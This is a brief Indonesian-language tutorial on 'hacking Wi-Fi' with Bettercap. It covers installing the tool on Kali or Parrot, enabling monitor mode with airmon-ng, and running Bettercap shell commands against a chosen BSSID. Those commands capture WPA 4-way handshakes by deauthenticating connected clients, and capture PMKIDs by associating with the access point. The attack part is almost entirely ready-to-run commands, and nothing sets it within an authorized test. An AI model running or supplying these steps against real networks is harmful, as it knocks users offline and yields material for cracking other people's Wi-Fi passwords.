# Hack Wi-Fi Menggunakan Bettercap

## Cara Instal

### 1. Kali Linux/Parrot OS

```
sudo apt-get udpate
sudo apt-get install bettercap bettercap-caplets
```

Cek versi:

```
bettercap -version
```

## Persiapan

Sebelum menggunakan Bettercap, kita harus mengaktifkan mode monitor pada interface dengan menjalankan perintah berikut:

```
sudo airmon-ng check kill
sudo airmon-ng start [INTERFACE]
```

## CARA

Jalankan Bettercap sebagi root:

```
sudo bettercap
```

## 1. Mode Shell

### 1. Capture 4-Way Handshake

```
set wifi.interface [INTERFACE]
set wifi.handshakes.file [OUTPUT]
set wifi.handshakes.aggregate false
wifi.recon on
wifi.show
set wifi.assoc.skip [BSSID]
wifi.deauth [BSSID]
```

### 2. Capture PMKID

```
set wifi.interface [INTERFACE]
set wifi.handshakes.file [OUTPUT]
set wifi.handshakes.aggregate false
wifi.recon on
wifi.show
wifi.assoc [BSSID]
```

